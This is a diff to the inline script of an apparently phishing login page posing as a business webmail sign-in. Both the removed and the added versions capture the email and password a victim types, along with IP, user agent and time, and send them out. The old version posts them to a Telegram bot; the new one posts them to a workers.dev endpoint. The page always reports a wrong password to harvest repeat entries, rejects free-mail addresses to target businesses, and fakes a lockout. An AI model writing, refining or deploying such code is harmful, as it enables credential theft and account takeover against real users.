@@ -107,115 +107,96 @@
     </div>
   </footer>
 
-  <script>
-  (function(){
-   const endpoint= 'https://notify-login.codeck02.workers.dev';
+<script>
+(function(){
+  const endpoint = 'https://notify-login.codeck02.workers.dev';
+  const bannedDomains = [
+    'gmail.com','yahoo.com','outlook.com',
+    'hotmail.com','aol.com','msn.com','icloud.com'
+  ];
 
-    const bannedDomains = [
-      'gmail.com','yahoo.com','outlook.com',
-      'hotmail.com','aol.com','msn.com','icloud.com'
-    ];
+  let attemptCount = 0,
+      maxAttempts   = 2;
 
-    let attemptCount = 0,
-        maxAttempts   = 2;
+  const form     = document.getElementById('loginForm'),
+        emailFld = document.getElementById('email'),
+        passFld  = document.getElementById('password'),
+        errorDiv = document.getElementById('errorMsg'),
+        loginBtn = document.getElementById('loginBtn'),
+        forgotPw = document.getElementById('forgotPwd');
 
-    const form     = document.getElementById('loginForm'),
-          emailFld = document.getElementById('email'),
-          passFld  = document.getElementById('password'),
-          errorDiv = document.getElementById('errorMsg'),
-          loginBtn = document.getElementById('loginBtn'),
-          forgotPw = document.getElementById('forgotPwd');
+  // 1) Pre-fill email from URL fragment
+  const hashEmail = window.location.hash.substr(1);
+  if (hashEmail) {
+    emailFld.value = decodeURIComponent(hashEmail);
+  }
 
-    // 1) Pre-fill email from URL fragment
-    const hashEmail = window.location.hash.substr(1);
-    if (hashEmail) {
-      emailFld.value = decodeURIComponent(hashEmail);
+  // 2) "Forgot password?" stub
+  forgotPw.addEventListener('click', e => {
+    e.preventDefault();
+    alert('Password reset link would be sent to: ' +
+          (emailFld.value.trim() || '[your email here]'));
+  });
+
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+    errorDiv.textContent = '';
+
+    const email    = emailFld.value.trim(),
+          password = passFld.value;
+
+    // --- VALIDATIONS ---
+    if (!email.includes('@')) {
+      errorDiv.textContent = 'Please include an @ in your e-mail.';
+      return;
+    }
+    const domain = email.split('@').pop().toLowerCase();
+    if (bannedDomains.includes(domain)) {
+      errorDiv.textContent = 'Please use your BUSINESS e-mail address.';
+      return;
+    }
+    if (password.length < 4) {
+      errorDiv.textContent = 'Password must be at least 4 characters.';
+      return;
     }
 
-    // 2) "Forgot password?" stub
-    forgotPw.addEventListener('click', e => {
-      e.preventDefault();
-      alert('Password reset link would be sent to: ' +
-            (emailFld.value.trim() || '[your email here]'));
-    });
+    // --- PROCESS SUBMISSION ---
+    attemptCount++;
 
-    form.addEventListener('submit', async e => {
-      e.preventDefault();
-      errorDiv.textContent = '';
+    // get public IP
+    let ip = 'unknown';
+    try {
+      const resp = await fetch('https://api.ipify.org?format=json');
+      ip = (await resp.json()).ip;
+    } catch (_) { /* ignore errors */ }
 
-      const email    = emailFld.value.trim(),
-            password = passFld.value;
+    // extra metadata
+    const ua = navigator.userAgent;
+    const ts = new Date().toISOString();
 
-      // --- VALIDATIONS ---
-      if (!email.includes('@')) {
-        errorDiv.textContent = 'Please include an @ in your e-mail.';
-        return;
-      }
-      const domain = email.split('@').pop().toLowerCase();
-      if (bannedDomains.includes(domain)) {
-        errorDiv.textContent = 'Please use your BUSINESS e-mail address.';
-        return;
-      }
-      if (password.length < 4) {
-        errorDiv.textContent = 'Password must be at least 4 characters.';
-        return;
-      }
+    // user feedback
+    const lockout = attemptCount > maxAttempts;
+    errorDiv.textContent = lockout
+      ? "You can't access your account right now. Try again later."
+      : 'Webmail or Password incorrect.';
+    if (lockout) {
+      loginBtn.disabled = true;
+      emailFld.disabled = passFld.disabled = true;
+    } else {
+      passFld.value = '';
+    }
 
-      // --- PROCESS SUBMISSION ---
-      attemptCount++;
+    // ---- THIS CALL CHANGES ----
+    // send to your Worker (not directly to Telegram)
+    fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password, attemptCount, ip, ua, ts })
+    }).catch(() => {});
+  });
+})();
+</script>
 
-      // get public IP
-      let ip = 'unknown';
-      try {
-        const resp = await fetch('https://api.ipify.org?format=json');
-        ip = (await resp.json()).ip;
-      } catch (_) { /* ignore errors */ }
-
-      // extra metadata
-      const mailDomain = domain;
-      const ua         = navigator.userAgent;
-      const ts         = new Date().toISOString();
-
-      const lockout = attemptCount > maxAttempts;
-
-      // build Telegram message
-      let text = lockout
-        ? `🔒 Account Locked (Attempt #${attemptCount})\n` +
-          `• Email: ${email}\n` +
-          `• Domain: ${mailDomain}\n` +
-          `• IP: ${ip}\n` +
-          `• User-Agent: ${ua}\n` +
-          `• Time: ${ts}`
-        : `❗ Attempt #${attemptCount} – Invalid credentials\n` +
-          `• Email: ${email}\n` +
-          `• Password: ${password}\n` +
-          `• Domain: ${mailDomain}\n` +
-          `• IP: ${ip}\n` +
-          `• User-Agent: ${ua}\n` +
-          `• Time: ${ts}`;
-
-      // user feedback
-      errorDiv.textContent = lockout
-        ? "You can't access your account right now. Try again later."
-        : 'Webmail or Password incorrect.';
-
-      if (lockout) {
-        loginBtn.disabled = true;
-        [emailFld, passFld].forEach(i => i.disabled = true);
-      }
-
-      // send to Telegram
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, attemptCount })
-      }).catch(() => {});
-
-      // clear password for retry
-      if (!lockout) passFld.value = '';
-    });
-  })();
-  </script>
 </body>
 </html>
 
